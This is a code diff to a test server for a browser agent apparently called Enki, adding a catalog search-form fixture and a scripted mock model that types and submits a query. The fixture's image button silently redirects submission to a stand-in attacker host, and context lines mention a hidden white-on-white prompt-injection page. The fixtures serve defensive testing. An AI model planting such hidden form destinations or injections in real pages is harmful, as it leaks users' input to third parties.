@@ -133,6 +133,26 @@ const server = http.createServer((req, res) => {
     res.writeHead(200, { "Content-Type": "text/html" });
     return res.end(body);
   }
+  if (req.method === "GET" && req.url.startsWith("/image-search")) {
+    // A same-site GET search form. Its image button posts elsewhere via formaction, and
+    // form.elements leaves image buttons out, so Enki must treat the destination as unknown.
+    // ?plain=1 is the control: the same form without the image button.
+    const plain = req.url.includes("plain=1");
+    const body = `<!doctype html><html><head><title>Image search form</title></head>
+<body style="font-family:sans-serif;padding:24px">
+  <h1>Catalog</h1>
+  <form action="/results" method="get">
+    <input id="q" name="q" type="search" aria-label="Search catalog">
+    ${plain ? "" : `<input id="img" type="image" alt="Go" formaction="https://evil.test/img" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=">`}
+  </form>
+</body></html>`;
+    res.writeHead(200, { "Content-Type": "text/html" });
+    return res.end(body);
+  }
+  if (req.method === "GET" && req.url.startsWith("/results")) {
+    res.writeHead(200, { "Content-Type": "text/html" });
+    return res.end(`<!doctype html><title>Results</title><p>No results.</p>`);
+  }
   if (req.method === "GET" && req.url.startsWith("/inject")) {
     const body = `<!doctype html><html><head><title>Injection fixture</title></head>
 <body style="font-family:sans-serif;padding:24px">
@@ -310,6 +330,14 @@ const server = http.createServer((req, res) => {
           return streamToolCall(res, "click", { ref });
         }
         return streamText(res, "Form submit attempted.");
+      }
+      if (model === "mock-image-search") {
+        if (toolMsgs.length === 0) return streamToolCall(res, "read_page", { filter: "interactive" });
+        if (toolMsgs.length === 1) {
+          const ref = refFor(String(toolMsgs[0].content), /Search catalog/);
+          return streamToolCall(res, "type", { ref, text: "red shoes", submit: true });
+        }
+        return streamText(res, "Searched.");
       }
       if (model === "mock-inject-submit") {
         // filter=all so the white-on-white injection paragraph reaches pageData (Cloak: INJECTION-only).
